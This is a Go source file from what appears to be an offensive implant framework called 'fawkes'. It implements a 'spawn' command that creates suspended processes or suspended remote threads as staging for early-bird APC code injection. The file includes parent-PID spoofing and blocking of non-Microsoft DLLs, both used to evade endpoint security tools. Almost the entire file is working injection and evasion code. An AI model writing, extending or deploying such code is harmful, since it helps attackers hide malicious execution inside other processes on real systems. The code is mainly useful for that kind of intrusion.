//go:build windows
// +build windows

// Package commands provides the spawn command for creating suspended processes and threads.
//
// This command supports two modes:
// - Process: Creates a new process in suspended state using CreateProcess with CREATE_SUSPENDED
// - Thread: Creates a new suspended thread in an existing process using CreateRemoteThread
//
// The returned PID/TID can be used with apc-injection for early bird injection techniques.
package commands

import (
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// Process creation flags
const (
	CREATE_SUSPENDED             = 0x00000004
	EXTENDED_STARTUPINFO_PRESENT = 0x00080000
	CREATE_NEW_CONSOLE           = 0x00000010
	CREATE_NO_WINDOW             = 0x08000000
)

// Thread creation flags
const (
	THREAD_CREATE_SUSPENDED = 0x00000004
)

// Process thread attribute constants
const (
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    = 0x00020000
	PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007
)

// Mitigation policy flags
const (
	PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000
)

// STARTUPINFO structure for CreateProcess
type STARTUPINFO struct {
	Cb            uint32
	Reserved      *uint16
	Desktop       *uint16
	Title         *uint16
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	CbReserved2   uint16
	LpReserved2   *byte
	StdInput      windows.Handle
	StdOutput     windows.Handle
	StdError      windows.Handle
}

// PROCESS_INFORMATION structure returned by CreateProcess
type PROCESS_INFORMATION struct {
	Process   windows.Handle
	Thread    windows.Handle
	ProcessId uint32
	ThreadId  uint32
}

// STARTUPINFOEX extends STARTUPINFO with a process thread attribute list
type STARTUPINFOEX struct {
	StartupInfo   STARTUPINFO
	AttributeList *PROC_THREAD_ATTRIBUTE_LIST
}

// PROC_THREAD_ATTRIBUTE_LIST is opaque — allocated and managed by the OS
type PROC_THREAD_ATTRIBUTE_LIST struct{}

// Note: kernel32, procOpenProcess, procCreateRemoteThread, procCloseHandle are defined in vanillainjection.go

var (
	procCreateProcessW                    = kernel32.NewProc("CreateProcessW")
	procGetModuleHandleW                  = kernel32.NewProc("GetModuleHandleW")
	procGetProcAddressA                   = kernel32.NewProc("GetProcAddress")
	procInitializeProcThreadAttributeList = kernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute         = kernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttributeList     = kernel32.NewProc("DeleteProcThreadAttributeList")
)

// SpawnCommand implements the spawn command
type SpawnCommand struct{}

// Name returns the command name
func (c *SpawnCommand) Name() string {
	return "spawn"
}

// Description returns the command description
func (c *SpawnCommand) Description() string {
	return "Spawn a suspended process or thread for injection techniques"
}

// Execute executes the spawn command
func (c *SpawnCommand) Execute(task structs.Task) structs.CommandResult {
	ensureInjectionAPIs()
	if runtime.GOOS != "windows" {
		return errorResult("This command is only supported on Windows")
	}

	params, parseErr := unmarshalParams[SpawnParams](task)
	if parseErr != nil {
		return *parseErr
	}

	params.Mode = strings.ToLower(params.Mode)

	switch params.Mode {
	case "process":
		return spawnSuspendedProcess(params.Path, params.PPID, params.BlockDLLs)
	case "thread":
		return spawnSuspendedThread(params.PID)
	default:
		return errorf("Unknown mode '%s'. Use 'process' or 'thread'", params.Mode)
	}
}

// spawnSuspendedProcess creates a new process in suspended state with optional PPID spoofing and DLL blocking
func spawnSuspendedProcess(path string, ppid int, blockDLLs bool) structs.CommandResult {
	var output string
	output += "[*] Spawn Mode: Suspended Process\n"

	if path == "" {
		return errorResult(output + "Error: No executable path specified")
	}

	output += fmt.Sprintf("[*] Target executable: %s\n", path)

	// Convert path to UTF16 for CreateProcessW
	commandLine, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return errorResult(output + fmt.Sprintf("Error converting path: %v", err))
	}

	creationFlags := uint32(CREATE_SUSPENDED | CREATE_NEW_CONSOLE)
	useExtended := ppid > 0 || blockDLLs

	var processInfo PROCESS_INFORMATION

	if useExtended {
		attrList, parentHandle, cleanup, attrErr := initProcAttrList(ppid, blockDLLs)
		if attrErr != nil {
			return errorResult(output + fmt.Sprintf("Error: %v", attrErr))
		}
		defer cleanup()
		if parentHandle != 0 {
			defer windows.CloseHandle(parentHandle)
			output += fmt.Sprintf("[*] PPID spoofing: parent PID %d\n[+] PPID attribute set\n", ppid)
		}
		if blockDLLs {
			output += "[*] Blocking non-Microsoft DLLs\n[+] DLL blocking policy set\n"
		}

		creationFlags |= EXTENDED_STARTUPINFO_PRESENT
		var startupInfoEx STARTUPINFOEX
		startupInfoEx.StartupInfo.Cb = uint32(unsafe.Sizeof(startupInfoEx))
		startupInfoEx.AttributeList = attrList

		ret, _, err := procCreateProcessW.Call(
			0,
			uintptr(unsafe.Pointer(commandLine)),
			0, 0,
			0, // bInheritHandles must be FALSE for PPID spoofing
			uintptr(creationFlags),
			0, 0,
			uintptr(unsafe.Pointer(&startupInfoEx)),
			uintptr(unsafe.Pointer(&processInfo)),
		)
		if ret == 0 {
			return errorResult(output + fmt.Sprintf("Error: CreateProcess failed: %v", err))
		}
	} else {
		// Simple case: no extended attributes needed
		var startupInfo STARTUPINFO
		startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))

		ret, _, err := procCreateProcessW.Call(
			0,
			uintptr(unsafe.Pointer(commandLine)),
			0,
			0,
			0,
			uintptr(creationFlags),
			0,
			0,
			uintptr(unsafe.Pointer(&startupInfo)),
			uintptr(unsafe.Pointer(&processInfo)),
		)
		if ret == 0 {
			return errorResult(output + fmt.Sprintf("Error: CreateProcess failed: %v", err))
		}
	}

	output += "[+] Process created successfully in SUSPENDED state\n"
	output += fmt.Sprintf("[+] Process ID (PID): %d\n", processInfo.ProcessId)
	output += fmt.Sprintf("[+] Thread ID (TID): %d\n", processInfo.ThreadId)
	output += fmt.Sprintf("[+] Process Handle: 0x%X\n", processInfo.Process)
	output += fmt.Sprintf("[+] Thread Handle: 0x%X\n", processInfo.Thread)
	output += "\n[*] Use these values with apc-injection:\n"
	output += fmt.Sprintf("    PID: %d\n", processInfo.ProcessId)
	output += fmt.Sprintf("    TID: %d\n", processInfo.ThreadId)

	// Close handles — the suspended process/thread persist independently of these handles.
	// apc-injection opens its own handles via PID/TID.
	windows.CloseHandle(processInfo.Thread)
	windows.CloseHandle(processInfo.Process)

	return successResult(output)
}

// spawnSuspendedThread creates a new suspended thread in an existing process
func spawnSuspendedThread(pid int) structs.CommandResult {
	var output string
	output += "[*] Spawn Mode: Suspended Thread\n"

	if pid <= 0 {
		return errorResult(output + "Error: Invalid PID specified")
	}

	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Open handle to target process
	hProcess, _, err := procOpenProcess.Call(
		uintptr(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE),
		0,
		uintptr(pid),
	)

	if hProcess == 0 {
		return errorResult(output + fmt.Sprintf("Error: OpenProcess failed: %v", err))
	}
	output += fmt.Sprintf("[+] Opened process handle: 0x%X\n", hProcess)

	// Get address of kernel32!Sleep as a benign start address
	// The thread will be suspended before it executes, so this is just a placeholder
	kernel32Name, _ := syscall.UTF16PtrFromString("kernel32.dll")
	hKernel32, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(kernel32Name)))

	if hKernel32 == 0 {
		windows.CloseHandle(windows.Handle(hProcess))
		return errorResult(output + "Error: Failed to get system library handle")
	}

	sleepProc, _ := syscall.BytePtrFromString("Sleep")
	sleepAddr, _, _ := procGetProcAddressA.Call(hKernel32, uintptr(unsafe.Pointer(sleepProc)))

	if sleepAddr == 0 {
		windows.CloseHandle(windows.Handle(hProcess))
		return errorResult(output + "Error: Failed to get Sleep address")
	}

	output += fmt.Sprintf("[*] Using kernel32!Sleep (0x%X) as thread start address\n", sleepAddr)

	// Create suspended thread
	var threadId uint32
	hThread, _, err := procCreateRemoteThread.Call(
		hProcess,
		0,                                // lpThreadAttributes
		0,                                // dwStackSize (default)
		sleepAddr,                        // lpStartAddress
		uintptr(0xFFFFFFFF),              // lpParameter (INFINITE sleep if ever resumed without APC)
		uintptr(THREAD_CREATE_SUSPENDED), // dwCreationFlags
		uintptr(unsafe.Pointer(&threadId)),
	)

	if hThread == 0 {
		windows.CloseHandle(windows.Handle(hProcess))
		return errorResult(output + fmt.Sprintf("Error: remote thread creation failed: %v", err))
	}

	output += "[+] Thread created successfully in SUSPENDED state\n"
	output += fmt.Sprintf("[+] Thread ID (TID): %d\n", threadId)
	output += fmt.Sprintf("[+] Thread Handle: 0x%X\n", hThread)
	output += "\n[*] Use these values with apc-injection:\n"
	output += fmt.Sprintf("    PID: %d\n", pid)
	output += fmt.Sprintf("    TID: %d\n", threadId)

	// Close handles — the suspended thread persists independently of these handles.
	// apc-injection opens its own handles via PID/TID.
	windows.CloseHandle(windows.Handle(hThread))
	windows.CloseHandle(windows.Handle(hProcess))

	return successResult(output)
}
